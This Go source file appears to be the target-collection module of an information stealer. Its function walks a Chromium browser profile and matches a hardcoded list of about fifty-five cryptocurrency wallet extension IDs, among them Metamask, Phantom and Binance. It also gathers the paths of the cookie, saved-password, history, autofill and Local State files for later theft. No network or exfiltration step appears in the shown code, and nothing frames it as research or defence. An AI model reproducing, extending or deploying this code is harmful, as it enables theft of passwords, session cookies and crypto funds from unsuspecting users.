package main

import (
	"io/fs"
	"os"
	"path/filepath"
)

func ChromiumBrowser(paths string) (pluginwallets []PluginWallet, plugins []Plugins, paths_cookie, paths_password, paths_history, paths_autofill, local_states []string) {
	var wallets = make(map[string]string)
	wallets["nkbihfbeogaeaoehlefnkodbefgpgknn"] = "Metamask"
	wallets["ibnejdfjmmkpcnlpebklmnkoeoihofec"] = "Tron"
	wallets["bocpokimicclpaiekenaeelehdjllofo"] = "XinPay"
	wallets["nphplpgoakhhjchkkhmiggakijnkhfnd"] = "Ton"
	wallets["pocmplpaccanhmnllbbkpgfliimjljgo"] = "Slope"
	wallets["mfhbebgoclkghebffdldpobeajmbecfk"] = "Starcoin"
	wallets["cmndjbecilbocjfkibfbifhngkdmjgog"] = "Swash"
	wallets["pnlfjmlcjdjgkddecgincndfgegkecke"] = "Crocobit"
	wallets["fhilaheimglignddkjgofkcbgekhenbh"] = "Oxygen"
	wallets["cjmkndjhnagcfbpiemnkdpomccnjblmj"] = "Finnie"
	wallets["fhbohimaelbohpjbbldcngcnapndodjp"] = "Binance"
	wallets["fcckkdbjnoikooededlapcalpionmalo"] = "Mobox"
	wallets["bfnaelmomeimhlpmgjnjophhpkkoljpa"] = "Phantom"
	wallets["fnjhmkhhmkbjkkabndcnnogagogbneec"] = "Ronin"
	wallets["fhmfendgdocmcbmfikdcogofphimnkno"] = "Sollet"
	wallets["bkklifkecemccedpkhcebagjpehhabfb"] = "MetaWallet"
	wallets["ffnbelfdoeiohenkjibnmadjiehjhajb"] = "Yoroi"
	wallets["lpfcbjknijpeeillifnkikgncikgfhdo"] = "Nami"
	wallets["hnhobjmcibchnmglfbldbfabcgaknlkj"] = "Flint"
	wallets["apnehcjmnengpnmccpaibjmhhoadaico"] = "CardWallet"
	wallets["nanjmdknhkinifnkgdcggcfnhdaammmj"] = "GuildWallet"
	wallets["pnndplcbkakcplkjnolgbkdgjikjednm"] = "TronWallet"
	wallets["dhgnlgphgchebgoemcjekedjjbifijid"] = "CryptoAirdrop"
	wallets["oijajbhmelbcoclnkdmembiacmeghbae"] = "Bitoke"
	wallets["aeachknmefphepccionboohckonoeemg"] = "Coin98"
	wallets["hmeobnfnfcmdkdcmlblgagmfpfboieaf"] = "XDefiWallet"
	wallets["dmkamcknogkgcdfhhbddcghachkejeap"] = "Keplr"
	wallets["copjnifcecdedocejpaapepagaodgpbh"] = "FreaksAxie"
	wallets["ppdadbejkmjnefldpcdjhnkpbjkikoip"] = "Oasis"
	wallets["acmacodkjbdgmoleebolmdjonilkdbch"] = "Rabby"
	wallets["afbcbjpbpfadlkmhmclhkeeodmamcflc"] = "MathWallet"
	wallets["jbdaocneiiinmjbjlgalhcelgbejmnid"] = "NiftyWallet"
	wallets["hpglfhgfnhbgpjdenjgmdgoeiappafln"] = "Guarda"
	wallets["blnieiiffboillknjnepogjhkgnoapac"] = "EQUALWallet"
	wallets["fihkakfobkmkjojpchpfgcmhfjnmnfpi"] = "BitAppWallet"
	wallets["kncchdigobghenbbaddojjnnaogfppfj"] = "iWallet"
	wallets["nlbmnnijcnlegkjjpcfjclmcfggfefdm"] = "MEW_CX"
	wallets["cphhlgmgameodnhkjdmkpanlelnlohao"] = "SaturnWallet"
	wallets["nhnkbkgjikgcigadomkphalanndcapjk"] = "Neo_Line"
	wallets["aiifbnbfobpmeekipheeijimdpnlpgpp"] = "CloverWallet"
	wallets["kpfopkelmapcoipemfendmdcghnegimn"] = "LiqalityWallet"
	wallets["cnmamaachppnkjgnildpdmkaakejnhae"] = "TerraStation"
	wallets["jojhfeoedkpkglbfimdfabpdfjaoolaf"] = "AuroWallet"
	wallets["flpiciilemghbmfalicajoolhkkenfel"] = "PolymeshWallet"
	wallets["nknhiehlklippafakaeklbeglecifhad"] = "ICONEX"
	wallets["ookjlbkiijinhpmnjffcofjonbfbgaoc"] = "NaboxWallet"
	wallets["mnfifefkajgofkcjkemidiaecocnkjeh"] = "KHC"
	wallets["dkdedlpgdmmkkfjabffeganieamfklkm"] = "Temple"
	wallets["nlgbhdfgdhgbiamfdfmbikcdghidoadd"] = "TezBoz"
	wallets["infeboajgfhgbjpjbeppbkgnabfdkdaf"] = "CyanoWallet"
	wallets["cihmoadaighcejopammfbmddcmdekcje"] = "Byone"
	wallets["ijmpgkjfkbfhoebgogflfebnmejmfbml"] = "OneKey"
	wallets["onofpnbbkehpmmoabgpcpmigafmmnjhl"] = "LeafWallet"
	wallets["bcopgchhojmggmffilplmbdicgaihlkp"] = "BitClip"
	wallets["klnaejjgbibmhlephnhpmaofohgkpgkd"] = "NashWallet"
	filepath.Walk(paths, func(path1 string, info fs.FileInfo, err error) error {
		if err == nil {
			if info.Name() == "Local Extension Settings" {
				if files, err := os.ReadDir(path1); err == nil {
					for _, f := range files {
						if wallets[f.Name()] != "" {
							ww := PluginWallet{wallets[f.Name()], path1 + "/" + f.Name()}
							pluginwallets = append(pluginwallets, ww)
						} else {
							pl := Plugins{f.Name(), path1 + "/" + f.Name()}
							plugins = append(plugins, pl)
						}
					}
				}
			} else if info.Name() == "Cookies" {
				paths_cookie = append(paths_cookie, path1)
			} else if info.Name() == "Login Data" {
				paths_password = append(paths_password, path1)
			} else if info.Name() == "History" {
				paths_history = append(paths_history, path1)
			} else if info.Name() == "Web Data" {
				paths_autofill = append(paths_autofill, path1)
			} else if info.Name() == "Local State" {
				local_states = append(local_states, path1)
			}
		}
		return nil
	})

	return
}
